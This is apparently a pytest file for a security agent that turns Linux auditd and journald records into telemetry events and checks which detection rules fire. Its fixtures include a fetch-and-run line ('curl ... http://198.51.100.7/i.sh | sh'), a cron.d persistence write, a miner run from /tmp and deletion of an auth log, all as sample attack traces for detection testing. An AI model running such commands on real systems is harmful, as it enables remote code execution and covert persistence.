"""Linux audit records to telemetry events, and the journal-backed collector, end to end with the engine."""

from __future__ import annotations

import json
from pathlib import Path

import pytest
from sentinel_agent.telemetry.auditd import (
    AuditState,
    decode,
    events_from_records,
    parse_audit_log,
    parse_line,
    parse_sockaddr,
    record_from_journal,
)
from sentinel_agent.telemetry.collector import (
    AUDIT_AFTER_CURSOR,
    AUDIT_FIRST_RUN,
    AUDIT_STATE_KEY,
    AuditdCollector,
    AuditExportCollector,
    CollectorError,
)
from sentinel_agent.telemetry.dataset import load_recording
from sentinel_agent.testing import FixtureContext, linux_host
from sentinel_core.telemetry import EventKind
from sentinel_detect import Engine

SAMPLE = Path(__file__).resolve().parents[1] / "samples" / "audit_suspicious.log"
STAMP = "msg=audit(1731975000.123:77):"


def test_parse_line_reads_header_and_fields():
    r = parse_line(f'type=SYSCALL {STAMP} arch=c000003e syscall=59 success=yes pid=10 exe="/usr/bin/ls" key=(null)')
    assert r.type == "SYSCALL" and r.serial == 77 and r.when.timestamp() == pytest.approx(1731975000.123)
    assert r.fields["exe"] == "/usr/bin/ls" and r.fields["pid"] == "10" and "exe" not in r.encoded and "pid" in r.encoded
    assert parse_line("Nov 19 kernel: something else") is None
    wrapped = parse_line(f'node=pi5 type=CWD {STAMP} cwd="/root"')  # a prefix before type= is tolerated
    assert wrapped.type == "CWD" and wrapped.fields["cwd"] == "/root"


@pytest.mark.parametrize(("value", "bare", "expected"), [
    ("/usr/bin/ls", False, "/usr/bin/ls"), ("2F746D702F6120622E7368", True, "/tmp/a b.sh"),
    ("deadbeef", False, "deadbeef"),  # quoted: literal text even though it looks like hex
    ("(null)", True, None), (None, True, None),
    ("xyz", True, "xyz"),
])
def test_decode_only_unhexes_bare_values(value, bare, expected):
    assert decode(value, bare) == expected


@pytest.mark.parametrize(("saddr", "expected"), [
    ("02000050C63364070000000000000000", ("198.51.100.7", 80)),
    ("020001BB08080808", ("8.8.8.8", 443)),
    ("0A0001BB0000000020010DB8000000000000000000000001" + "00000000", ("2001:db8::1", 443)),
    ("01002F72756E2F6462", None),  # AF_UNIX: a local socket, not a network connection
    ("zz", None), (None, None), ("0200", None),
])
def test_parse_sockaddr(saddr, expected):
    assert parse_sockaddr(saddr) == expected


def test_saved_log_becomes_events_with_lineage():
    events = parse_audit_log(SAMPLE.read_text(encoding="utf-8"), host="pi5")
    kinds = [e.kind for e in events]
    assert kinds == [EventKind.PROCESS_CREATE] * 3 + [EventKind.NETWORK_CONNECT, EventKind.FILE_WRITE,
                                                      EventKind.PROCESS_CREATE]  # the failed exec is dropped
    shell, pipe, curl, net, cron, miner = events
    assert pipe.command_line == "sh -c 'curl -fsSL http://198.51.100.7/i.sh | sh'"  # hex-encoded argument decoded
    assert pipe.parent_guid == shell.process_guid and pipe.parent_image == "/usr/bin/bash" and pipe.parent_pid == 1500
    assert curl.process_guid == "lx:1534:911" and curl.parent_guid == pipe.process_guid
    assert (net.dest_ip, net.dest_port, net.direction) == ("198.51.100.7", 80, "outbound")
    assert net.process_guid == curl.process_guid and net.image == "/usr/bin/curl"  # tied to the process that made it
    assert cron.file_path == "/etc/cron.d/sysupdate" and cron.image == "/usr/bin/dash"  # relative name joined to cwd
    assert miner.image == "/tmp/.x/miner" and miner.user == "uid=0" and miner.details["audit_key"] == "sentinel_exec"
    assert shell.details["current_directory"] == "/home/sam" and all(e.host == "pi5" for e in events)
    assert [e.seq for e in events] == list(range(6))


def test_saved_log_drives_the_linux_rules():
    events = AuditExportCollector(SAMPLE, host="pi5").collect()
    fired = {d.rule_id for d in Engine().feed_stream(events)}
    assert fired == {"linux.exec.remote_shell", "linux.exec.from_tmp", "linux.persist.startup_location"}
    assert {d.rule_id for d in Engine().feed_stream(load_recording(SAMPLE))} == fired  # the dataset loader agrees


def test_pid_reuse_gets_a_new_identity_and_unknown_parents_are_placeholders():
    state = AuditState()

    def exec_line(serial: int, pid: int, ppid: int, exe: str) -> list[str]:
        stamp = f"msg=audit(17319750{serial:02d}.000:{serial}):"
        return [f'type=SYSCALL {stamp} arch=c000003e syscall=59 success=yes ppid={ppid} pid={pid} uid=1000 exe="{exe}"',
                f'type=EXECVE {stamp} argc=1 a0="{exe}"']

    lines = exec_line(1, 500, 1, "/usr/bin/a") + exec_line(2, 500, 1, "/usr/bin/b") + exec_line(3, 600, 500, "/usr/bin/c")
    first, second, child = parse_audit_log("\n".join(lines), "h", state)
    assert first.process_guid == "lx:500:1" and second.process_guid == "lx:500:2"
    assert first.parent_guid == "lx:1:0" and first.parent_image is None  # started before we were listening
    assert child.parent_guid == "lx:500:2" and child.parent_image == "/usr/bin/b"  # the current holder of pid 500
    # state carries across batches, as it does between agent cycles
    later = parse_audit_log("\n".join(exec_line(4, 700, 600, "/usr/bin/d")), "h", state)[0]
    assert later.parent_guid == "lx:600:3" and later.seq == 3


def test_long_arguments_and_interleaved_events():
    a, b = "msg=audit(1731975000.000:1):", "msg=audit(1731975000.000:2):"
    text = "\n".join([
        f'type=SYSCALL {b} arch=c000003e syscall=59 success=yes ppid=1 pid=20 uid=0 exe="/usr/bin/python3"',
        f'type=SYSCALL {a} arch=c000003e syscall=59 success=yes ppid=1 pid=10 uid=0 exe="/usr/bin/bash"',
        f'type=EXECVE {a} argc=3 a0="bash" a1="-c" a2[0]="echo one; " a2[1]="echo two"',
        f'type=EXECVE {b} argc=2 a0="python3" a1=""',
    ])
    first, second = parse_audit_log(text, "h")
    assert first.pid == 10 and first.command_line == "bash -c 'echo one; echo two'"
    assert second.pid == 20 and second.command_line == "python3 ''"


def test_connect_is_recognised_per_architecture_and_other_syscalls_are_ignored():
    def group(arch: str, syscall: int, success: str = "yes", exit_code: int = 0) -> str:
        stamp = f"msg=audit(1731975000.000:{syscall}):"
        return (f'type=SYSCALL {stamp} arch={arch} syscall={syscall} success={success} exit={exit_code} pid=9 uid=0 '
                f'exe="/usr/bin/x"\ntype=SOCKADDR {stamp} saddr=020001BB08080808')

    assert [e.kind for e in parse_audit_log(group("c000003e", 42), "h")] == [EventKind.NETWORK_CONNECT]
    assert [e.kind for e in parse_audit_log(group("c00000b7", 203), "h")] == [EventKind.NETWORK_CONNECT]
    assert [e.kind for e in parse_audit_log(group("c000003e", 42, "no", -115), "h")] == [EventKind.NETWORK_CONNECT]
    assert parse_audit_log(group("c000003e", 42, "no", -111), "h") == []  # refused: no connection was made
    assert parse_audit_log(group("c000003e", 49), "h") == []  # bind(2) also carries a SOCKADDR
    assert parse_audit_log(group("c00000b7", 42), "h") == []  # 42 is not connect on arm64


def test_file_delete_and_records_without_a_syscall():
    stamp = "msg=audit(1731975000.000:5):"
    text = (f'type=SYSCALL {stamp} arch=c000003e syscall=87 success=yes pid=9 uid=0 exe="/usr/bin/rm"\n'
            f'type=PATH {stamp} item=1 name="/var/log/auth.log" nametype=DELETE\n'
            f'type=PATH {stamp} item=0 name="/var/log/" nametype=PARENT\n'
            'type=USER_LOGIN msg=audit(1731975001.000:6): pid=1 uid=0 msg=\'op=login\'')
    (event,) = parse_audit_log(text, "h")
    assert event.kind is EventKind.FILE_DELETE and event.file_path == "/var/log/auth.log"


# ---------------------------------------------------------------- journal entries and the live collector


def _journal(lines: list[str], split_fields: bool = False) -> str:
    out = []
    for i, line in enumerate(lines):
        record = parse_line(line)
        if split_fields:  # the shape journald itself stores: type and serial in fields, body in MESSAGE
            body = line.split("): ", 1)[1]
            entry = {"_TRANSPORT": "audit", "_AUDIT_TYPE_NAME": record.type, "_AUDIT_ID": str(record.serial),
                     "_SOURCE_REALTIME_TIMESTAMP": str(int(record.when.timestamp() * 1_000_000)),
                     "MESSAGE": f"{record.type} {body}"}
        else:  # the shape auditd's syslog plugin forwards: the raw line
            entry = {"_TRANSPORT": "audit", "MESSAGE": f"audisp-syslog: {line}"}
        out.append(json.dumps({**entry, "__CURSOR": f"s=abc;i={i:x};b=def;m=1;t=1;x=1"}))
    return "\n".join(out)


@pytest.mark.parametrize("split_fields", [False, True])
def test_both_journal_shapes_give_the_same_events_as_the_raw_log(split_fields):
    lines = SAMPLE.read_text(encoding="utf-8").splitlines()
    entries = [json.loads(row) for row in _journal(lines, split_fields).splitlines()]
    records = [r for r in (record_from_journal(e) for e in entries) if r is not None]
    from_journal = events_from_records(records, "pi5")
    from_file = parse_audit_log("\n".join(lines), "pi5")
    assert [e.model_dump() for e in from_journal] == [e.model_dump() for e in from_file]


def test_journal_entries_that_are_not_audit_records_are_ignored():
    assert record_from_journal({"MESSAGE": "Started Daily apt download activities."}) is None
    assert record_from_journal({"MESSAGE": [83, 89, 83]}) is None  # bytes, no serial
    assert record_from_journal({"MESSAGE": None}) is None
    assert record_from_journal({"MESSAGE": "SYSCALL arch=c000003e", "_AUDIT_ID": "x"}) is None


def _ctx(commands: dict) -> FixtureContext:
    return FixtureContext(linux_host(), {"commands": commands})


def test_collector_reads_first_run_then_continues_from_the_cursor():
    lines = SAMPLE.read_text(encoding="utf-8").splitlines()
    state = AuditState()
    ctx = _ctx({AUDIT_FIRST_RUN.name: {"stdout": _journal(lines[:8])}})
    first = AuditdCollector(ctx, state).collect()
    assert [e.kind for e in first] == [EventKind.PROCESS_CREATE] * 3 and first[0].host == "pi5"
    cursor = ctx.state.get(AUDIT_STATE_KEY)
    assert cursor == "s=abc;i=7;b=def;m=1;t=1;x=1"

    ctx2 = _ctx({AUDIT_AFTER_CURSOR.name: {"stdout": _journal(lines[8:])}})
    ctx2.state.set(AUDIT_STATE_KEY, cursor)
    second = AuditdCollector(ctx2, state).collect()  # the same AuditState: lineage survives the batch boundary
    assert [e.kind for e in second] == [EventKind.NETWORK_CONNECT, EventKind.FILE_WRITE, EventKind.PROCESS_CREATE]
    assert second[0].process_guid == first[2].process_guid and second[2].seq == 5

    engine = Engine()
    fired = {d.rule_id for d in engine.feed_stream(first)} | {d.rule_id for d in engine.feed_stream(second)}
    assert fired == {"linux.exec.remote_shell", "linux.exec.from_tmp", "linux.persist.startup_location"}


def test_collector_explains_why_it_has_nothing():
    with pytest.raises(CollectorError, match="journalctl is not installed"):
        AuditdCollector(_ctx({AUDIT_FIRST_RUN.name: {"error": "not_found"}})).collect()
    with pytest.raises(CollectorError, match="systemd-journal group"):
        AuditdCollector(_ctx({AUDIT_FIRST_RUN.name: {
            "stdout": "", "stderr": "Hint: You are currently not seeing messages from other users."}})).collect()
    with pytest.raises(CollectorError, match="Load the audit rules"):
        AuditdCollector(_ctx({AUDIT_FIRST_RUN.name: {"stdout": ""}})).collect()
    with pytest.raises(CollectorError, match="could not be read"):
        AuditdCollector(_ctx({AUDIT_FIRST_RUN.name: {"error": "failed", "message": "boom", "exit_code": 2}})).collect()
    quiet = _ctx({AUDIT_AFTER_CURSOR.name: {"stdout": ""}})
    quiet.state.set(AUDIT_STATE_KEY, "s=abc;i=1;b=def;m=1;t=1;x=1")
    assert AuditdCollector(quiet).collect() == []  # nothing new since last time is normal, not an error
